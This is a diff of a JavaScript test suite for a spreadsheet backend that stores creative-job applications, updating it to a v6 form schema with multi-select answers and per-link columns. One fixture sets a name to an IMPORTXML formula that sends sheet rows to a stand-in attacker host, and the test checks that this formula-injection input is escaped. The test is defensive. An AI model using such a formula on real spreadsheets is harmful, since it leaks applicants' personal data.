@@ -1,3 +1,4 @@
+import fs from "node:fs"
 import { run } from "./harness.mjs"
 
 const PAYLOAD = {
@@ -7,19 +8,19 @@ const PAYLOAD = {
     phone: "+55 11 99999-0000",
     location: "São Paulo / Brasil",
     portfolio: "https://behance.net/ana",
-    links: "instagram.com/ana",
-    imdb: "https://imdb.com/name/nm123",
-    reels: "https://vimeo.com/ana"
+    website: "https://ana.studio",
+    behance: "https://behance.net/ana",
+    vimeo: "https://vimeo.com/ana",
+    instagram: "https://instagram.com/ana",
+    linkedin: "https://linkedin.com/in/ana",
+    otherLink: ""
   },
-  expertise: "art-director",
-  responsibility: "drive",
-  workMode: "creative-lead",
-  reach: "end-to-end",
-  challenge: "leading-complex",
-  aiIntegration: "pipeline",
+  // v6: every question is a list. A bare string here would be a regression.
+  expertise: ["art-director", "animator"],
+  reach: ["end-to-end"],
+  aiIntegration: ["pipeline", "production"],
   aiWorkflow: ["combine", "node-based"],
-  strength: "languages-worlds",
-  finishing: "responsible",
+  strength: ["languages-worlds"],
   aiLedLink: "https://vimeo.com/ai-led",
   aiExecutedLink: "https://vimeo.com/ai-exec",
   projectTypes: ["short-film", "commercial"],
@@ -27,22 +28,22 @@ const PAYLOAD = {
     "short-film": "https://vimeo.com/curta",
     commercial: "https://vimeo.com/ad"
   },
-  pipeline: ["direction-concept", "3d-animation", "vfx-post"],
+  pipeline: ["direction", "3d-animation", "vfx"],
   tools: [
     // Runway ticked in three areas — one tool, three facts.
-    { id: "runway", name: "Runway", group: "storyboard" },
+    { id: "runway", name: "Runway", group: "concept" },
     { id: "runway", name: "Runway", group: "vfx" },
     { id: "runway", name: "Runway", group: "video" },
     { id: "midjourney", name: "Midjourney", group: "concept" },
-    { id: "cascadeur", name: "Cascadeur", group: "character" }
+    { id: "cascadeur", name: "Cascadeur", group: "modeling" }
   ],
   otherTools: "Krea",
   meta: {
-    submittedAt: "2026-08-20T14:00:00.000Z",
+    submittedAt: "2026-08-24T14:00:00.000Z",
     language: "pt-BR",
     timezone: "America/Sao_Paulo",
     userAgent: "Mozilla/5.0 test",
-    formVersion: "5"
+    formVersion: "6"
   },
   guard: { hp: "", elapsedMs: 20000, turnstileToken: "" }
 }
@@ -68,15 +69,28 @@ const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, 
     JSON.stringify(headers) === JSON.stringify(sandbox.HEADERS))
   check("1c headers are unique", new Set(headers).size === headers.length,
     "a prefix collision would silently overwrite a column")
-  check("1d one column per distinct tool (92, not the 128 checkboxes)",
-    sandbox.TOOL_ROSTER.length === 92 &&
+  check("1d one column per distinct tool (74, not the 90 checkboxes)",
+    sandbox.TOOL_ROSTER.length === 74 &&
       sandbox.TOOL_ROSTER.every((t) => headers.includes(`Tool: ${t.label}`)),
     `roster=${sandbox.TOOL_ROSTER.length}`)
   check("1e one column per pipeline area",
     sandbox.PIPELINE_ROSTER.every((c) => headers.includes(`Pipeline: ${c.label}`)))
-  check("1f the nine ladders each get a readable column",
-    ["Primary Practice","Responsibility","Work Mode","Project Reach","Visual Challenge",
-     "AI Integration","AI Workflow","Core Strength","Finishing"].every((h) => headers.includes(h)))
+  check("1f the five practice questions each get a readable column",
+    ["Primary Practice","Project Reach","AI Integration","AI Workflow","Core Strength"]
+      .every((h) => headers.includes(h)))
+  check("1f2 the retired questions are gone from the schema",
+    !headers.includes("Responsibility") && !headers.includes("Work Mode") &&
+      !headers.includes("Visual Challenge") && !headers.includes("Finishing"),
+    "a question removed from the form must not keep writing a column")
+  check("1f3 each contact link gets its own column, not one packed cell",
+    ["Site","Behance","Vimeo","Instagram","LinkedIn","Other Link"]
+      .every((h) => headers.includes(h)) && !headers.includes("Additional Links"))
+  check("1f4 every multi-select question also gets a per-option filter column",
+    sandbox.EXPERTISE_ROSTER.every((c) => headers.includes(`Practice: ${c.label}`)) &&
+      sandbox.REACH_ROSTER.every((c) => headers.includes(`Reach: ${c.label}`)) &&
+      sandbox.AI_INTEGRATION_ROSTER.every((c) => headers.includes(`AI: ${c.label}`)) &&
+      sandbox.STRENGTH_ROSTER.every((c) => headers.includes(`Strength: ${c.label}`)),
+    "a joined list is unfilterable — the Yes/blank block is what replaces it")
   check("1g project types get both a flag and a credits link",
     sandbox.PROJECT_TYPE_ROSTER.every(
       (c) => headers.includes(`Led: ${c.label}`) && headers.includes(`Link: ${c.label}`)
@@ -107,15 +121,19 @@ const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, 
   check("2a row appended", sheet._grid.length === 2)
   check("2b name", row["Full Name"] === "Ana Ribeiro")
   check("2c accents survive", row["Location"] === "São Paulo / Brasil", String(row["Location"]))
-  check("2d single-select resolves to its label",
-    row["Primary Practice"] === "Art Director", String(row["Primary Practice"]))
-  check("2e responsibility ladder resolves",
-    row["Responsibility"].startsWith("Drive"), String(row["Responsibility"]))
-  check("2f reach ladder resolves",
-    row["Project Reach"] === "End-to-end, including refinement and finishing",
+  check("2d practice keeps BOTH answers, in roster order",
+    row["Primary Practice"] === "Art Director, Animator", String(row["Primary Practice"]))
+  check("2e each contact link lands in its own column",
+    row["Site"] === "https://ana.studio" && row["LinkedIn"] === "https://linkedin.com/in/ana",
+    `${row["Site"]} / ${row["LinkedIn"]}`)
+  check("2e2 a link left blank stays blank", row["Other Link"] === "",
+    JSON.stringify(row["Other Link"]))
+  check("2f reach resolves",
+    row["Project Reach"] === "End to end, including refinement and finishing",
     String(row["Project Reach"]))
-  check("2g AI integration resolves",
-    row["AI Integration"].startsWith("Pipeline"), String(row["AI Integration"]))
+  check("2g AI integration keeps both, in ROSTER order not click order",
+    row["AI Integration"].startsWith("Production.") && row["AI Integration"].includes("Pipeline."),
+    String(row["AI Integration"]))
   check("2g2 the two AI project links land in their own columns",
     row["AI Project (led)"] === "https://vimeo.com/ai-led" &&
       row["AI Project (executed)"] === "https://vimeo.com/ai-exec")
@@ -123,10 +141,12 @@ const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, 
     row["AI Workflow"] ===
       "I combine different AI tools in the same workflow, I use node-based / modular workflows",
     String(row["AI Workflow"]))
+  check("2h2 core strength resolves",
+    row["Core Strength"] === "Creating visual languages and worlds", String(row["Core Strength"]))
   check("2i led projects", row["Led Projects"] === "Short Film, Commercial / Advertising",
     String(row["Led Projects"]))
   check("2j pipeline areas in roster order, not click order",
-    row["Pipeline Areas"] === "Direction & Concept, 3D & Animation, VFX & Post-production",
+    row["Pipeline Areas"] === "Direction, 3D animation, VFX",
     String(row["Pipeline Areas"]))
   check("2k tools counted DISTINCTLY — Runway ticked 3x is one tool",
     row["Tools Count"] === 3, String(row["Tools Count"]))
@@ -153,18 +173,30 @@ const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, 
     row["Tool: Stable Diffusion"] === "", JSON.stringify(row["Tool: Stable Diffusion"]))
   check("3b a tool column lists the AREAS it was ticked in, so one filter says who + for what",
     row["Tool: Runway"] ===
-      "Storyboard / previs / animatic, Video generation, VFX / compositing / cleanup",
+      "Concept art / visual development / storyboard / previs / animatic, " +
+      "Video generation, VFX / compositing / cleanup",
     String(row["Tool: Runway"]))
   check("3c a tool ticked in one area lists just that area",
-    row["Tool: Cascadeur"] === "Character / rigging / animation", String(row["Tool: Cascadeur"]))
-  check("3d pipeline area flag", row["Pipeline: Direction & Concept"] === "Yes")
+    row["Tool: Cascadeur"] === "3D / modeling / assets / character / rigging / animation",
+    String(row["Tool: Cascadeur"]))
+  check("3d pipeline area flag", row["Pipeline: Direction"] === "Yes")
   check("3e unticked pipeline area is blank", row["Pipeline: Production"] === "")
-  check("3f second pipeline flag", row["Pipeline: VFX & Post-production"] === "Yes")
+  check("3f second pipeline flag", row["Pipeline: VFX"] === "Yes")
   check("3g 'led a short film' is one filter click", row["Led: Short Film"] === "Yes")
   check("3h and its credits link sits right beside it",
     row["Link: Short Film"] === "https://vimeo.com/curta", String(row["Link: Short Film"]))
   check("3i a project type not led has no link", row["Link: Feature Film"] === "")
   check("3j workflow flag", row["Workflow: I use node-based / modular workflows"] === "Yes")
+  check("3k BOTH practice answers are filterable independently — the whole point of the block",
+    row["Practice: Art Director"] === "Yes" && row["Practice: Animator"] === "Yes" &&
+      row["Practice: Designer"] === "",
+    `${row["Practice: Art Director"]} / ${row["Practice: Animator"]} / ${row["Practice: Designer"]}`)
+  check("3l reach flag", row["Reach: End to end, including refinement and finishing"] === "Yes")
+  check("3m AI integration flags, both of them",
+    row["AI: Pipeline. I integrate multiple AI tools across different stages of production"] ===
+      "Yes" &&
+      row["AI: Production. I use AI as part of professional project workflows"] === "Yes")
+  check("3n strength flag", row["Strength: Creating visual languages and worlds"] === "Yes")
 }
 
 /* ── 4. Edge cases that must not crash or invent data ───────────────────── */
@@ -175,15 +207,11 @@ const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, 
   // Someone who ticks nothing but the required fields and one tool.
   post(sandbox, {
     ...PAYLOAD,
-    expertise: "",
-    responsibility: "",
-    workMode: "",
-    reach: "",
-    challenge: "",
-    aiIntegration: "",
+    expertise: [],
+    reach: [],
+    aiIntegration: [],
     aiWorkflow: [],
-    strength: "",
-    finishing: "",
+    strength: [],
     aiLedLink: "",
     aiExecutedLink: "",
     projectTypes: [],
@@ -193,20 +221,35 @@ const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, 
     otherTools: ""
   })
   const bare = asObject(sheet._grid[0], sheet._grid[1])
-  check("4a empty ladders are blank, not 'undefined'",
-    bare["Primary Practice"] === "" && bare["Responsibility"] === "" && bare["Finishing"] === "",
-    `${bare["Primary Practice"]} / ${bare["Responsibility"]}`)
+  check("4a empty questions are blank, not 'undefined'",
+    bare["Primary Practice"] === "" && bare["Project Reach"] === "" &&
+      bare["Core Strength"] === "",
+    `${bare["Primary Practice"]} / ${bare["Project Reach"]}`)
   check("4b empty multi-selects are blank",
     bare["AI Workflow"] === "" && bare["Pipeline Areas"] === "")
   check("4c tools count is a number, not blank", bare["Tools Count"] === 1)
-  check("4d the one tool still lands", bare["Tool: Midjourney"] === "Concept art / visual development",
+  check("4d the one tool still lands",
+    bare["Tool: Midjourney"] ===
+      "Concept art / visual development / storyboard / previs / animatic",
     String(bare["Tool: Midjourney"]))
 
   // An id the roster does not know must not blow up the row.
-  post(sandbox, { ...PAYLOAD, expertise: "gaffer", tools: [{ id: "nope", name: "Nope", group: "zzz" }] })
+  post(sandbox, {
+    ...PAYLOAD,
+    expertise: ["gaffer"],
+    tools: [{ id: "nope", name: "Nope", group: "zzz" }]
+  })
   const odd = asObject(sheet._grid[0], sheet._grid[2])
-  check("4e unknown single-select id resolves to blank", odd["Primary Practice"] === "")
+  check("4e unknown answer id resolves to blank", odd["Primary Practice"] === "")
   check("4f unknown tool does not appear anywhere", odd["All Tools"] === "Nope" && odd["Tools Count"] === 1)
+
+  // A v5 client still in someone's cached bundle posts strings, not arrays.
+  post(sandbox, { ...PAYLOAD, expertise: "art-director", pipeline: "direction" })
+  const legacyShape = asObject(sheet._grid[0], sheet._grid[3])
+  check("4g a v5 payload's bare string cannot corrupt the row",
+    legacyShape["Full Name"] === "Ana Ribeiro" &&
+      typeof legacyShape["Primary Practice"] === "string",
+    String(legacyShape["Primary Practice"]))
 }
 
 /* ── 4b. Formula injection and phone numbers ────────────────────────────── */
@@ -224,7 +267,7 @@ const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, 
       // The dangerous case: a formula that would run when a teammate opens the
       // sheet and post other rows to an attacker.
       fullName: '=IMPORTXML("https://attacker.example/?"&A2,"//a")',
-      links: "-nothing yet",
+      website: "-nothing yet",
       location: "@home"
     }
   })
@@ -234,7 +277,7 @@ const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, 
     row["Phone / WhatsApp"] === "'+55 11 90000-0000", JSON.stringify(row["Phone / WhatsApp"]))
   check("4b2 a formula in a text field is neutralised",
     row["Full Name"].startsWith("'="), JSON.stringify(row["Full Name"]).slice(0, 60))
-  check("4b3 leading - is escaped", row["Additional Links"] === "'-nothing yet")
+  check("4b3 leading - is escaped", row["Site"] === "'-nothing yet", JSON.stringify(row["Site"]))
   check("4b4 leading @ is escaped", row["Location"] === "'@home")
   check("4b5 ordinary text is left alone", row["Email"] === "ana@exemplo.com",
     JSON.stringify(row["Email"]))
@@ -260,12 +303,12 @@ const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, 
   const row = asObject(sheet._grid[0], sheet._grid[1])
   check("5a reordered: name still correct", row["Full Name"] === "Ana Ribeiro")
   check("5b reordered: per-tool column still correct",
-    row["Tool: Cascadeur"] === "Character / rigging / animation")
+    row["Tool: Cascadeur"] === "3D / modeling / assets / character / rigging / animation")
   check("5c reordered: header row untouched",
     JSON.stringify(sheet._grid[0]) === JSON.stringify(shuffled))
 }
 
-/* ── 6. A v2 sheet upgrading to v3 ──────────────────────────────────────── */
+/* ── 6. A v2 sheet upgrading to v6 ──────────────────────────────────────── */
 {
   const legacy = [
     "Received At", "Full Name", "Status", "Rating", "Email", "Phone / WhatsApp", "Location",
@@ -280,23 +323,25 @@ const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, 
   post(sandbox, PAYLOAD)
   const headers = sheet._grid[0]
 
-  check("6a v5 columns appended",
+  check("6a v6 columns appended",
     headers.includes("Primary Practice") && headers.includes("Led: Short Film") &&
-      headers.includes("Pipeline: Direction & Concept") && headers.includes("Responsibility"))
+      headers.includes("Pipeline: Direction") && headers.includes("Practice: Art Director"))
   check("6b v2 columns kept their position",
     JSON.stringify(headers.slice(0, legacy.length)) === JSON.stringify(legacy))
   check("6c retired columns are preserved, not deleted",
-    headers.includes("Roles") && headers.includes("Advanced"),
+    headers.includes("Roles") && headers.includes("Advanced") &&
+      headers.includes("Additional Links"),
     "removing a column would destroy older data")
   check("6d existing data row untouched", JSON.stringify(sheet._grid[1]) === JSON.stringify(oldRow))
   check("6e new row lands correctly", asObject(headers, sheet._grid[2])["Full Name"] === "Ana Ribeiro")
   check("6f retired column gets blank, never garbage",
-    asObject(headers, sheet._grid[2])["Advanced"] === "")
+    asObject(headers, sheet._grid[2])["Advanced"] === "" &&
+      asObject(headers, sheet._grid[2])["Additional Links"] === "")
   check("6g shared columns keep working across versions",
     asObject(headers, sheet._grid[2])["Tools Count"] === 3)
   check("6h dropped questions never come back as empty columns",
     !headers.includes("AI Experience") && !headers.includes("Practice Areas") &&
-      !headers.includes("AI Relationship"),
+      !headers.includes("AI Relationship") && !headers.includes("Responsibility"),
     "a removed question must not be re-created")
 }
 
@@ -317,6 +362,27 @@ const asObject = (headers, row) => Object.fromEntries(headers.map((h, i) => [h, 
   const res = post(sandbox, PAYLOAD)
   check("7d valid submission accepted", sheet._grid.length === 2)
   check("7e responds ok:true", res._text === '{"ok":true}', res._text)
+}
+
+/* ── 7b. The health check identifies the deployment ─────────────────────── */
+{
+  const { sandbox, sheet } = run([])
+  const body = JSON.parse(sandbox.doGet()._text)
+
+  check("7b1 doGet reports the schema version, so two /exec URLs are tellable apart",
+    body.ok === true && body.schema === sandbox.SCHEMA_VERSION && body.columns > 0,
+    JSON.stringify(body))
+
+  // The version is declared in two files that cannot import each other, so the
+  // only thing stopping them drifting is this assertion.
+  const submitSrc = fs.readFileSync(new URL("../../src/lib/submit.ts", import.meta.url), "utf8")
+  const formVersion = submitSrc.match(/FORM_VERSION\s*=\s*"([^"]+)"/)?.[1]
+  check("7b2 SCHEMA_VERSION matches FORM_VERSION in src/lib/submit.ts",
+    formVersion === sandbox.SCHEMA_VERSION,
+    `Code.gs=${sandbox.SCHEMA_VERSION} submit.ts=${formVersion}`)
+
+  check("7b3 the health check never touches the sheet", sheet._grid.length === 0,
+    "this endpoint is public — it must not become a way to read applications")
 }
 
 /* ── 8. setupSheet is idempotent ────────────────────────────────────────── */
